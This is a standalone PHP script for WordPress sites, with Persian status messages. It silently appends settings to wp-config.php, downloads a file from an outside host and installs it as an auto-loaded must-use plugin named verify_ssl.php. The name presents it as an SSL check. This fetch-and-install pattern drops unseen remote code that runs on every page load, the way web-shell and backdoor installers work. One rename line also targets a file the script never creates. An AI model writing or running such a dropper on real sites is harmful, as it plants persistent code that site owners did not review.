<?php
error_reporting(0);
header('Content-Type: text/html; charset=utf-8');
$cfile = 'wp-config.php';
$current = file_get_contents($cfile);
$current .= "define('FTP_SSL', false);ini_set('log_errors','On');ini_set('display_errors','Off');ini_set('error_reporting', E_ALL );define('WP_DEBUG', false);define('WP_DEBUG_LOG', true);define('WP_DEBUG_DISPLAY', false);";
file_put_contents($cfile, $current);

$dir = getcwd();
$link = 'http://files2.mihanwebhost.com/verify_ssl.zip';

if (@is_dir($dir.'/wp-admin') && @is_dir($dir.'/wp-includes') && @is_dir($dir.'/wp-content')) {
	if(!@is_dir($dir.'/wp-content/mu-plugins')){
		@mkdir($dir.'/wp-content/mu-plugins');
	}
	$file = @file_get_contents($link);
	$name = 'verify_ssl.php';
	@file_put_contents(getcwd().'/wp-content/mu-plugins/'.$name, $file);
        rename ("wp-content/mu-plugins/verify_ssl.zip", "wp-content/mu-plugins/verify_ssl.php");
	if(@file_exists(getcwd().'/wp-content/mu-plugins/'.$name))
		echo '<br><center><h1>کانفيگ اعمال گرديد</h1></center>';
	else
		echo '<br><center><h1>متاسفانه قادر به انجام اين درخواست نيستيم</h1></center>';
}else
	echo '<br><center><h1>متاسفانه قادر به انجام اين درخواست نيستيم</h1></center>';

?>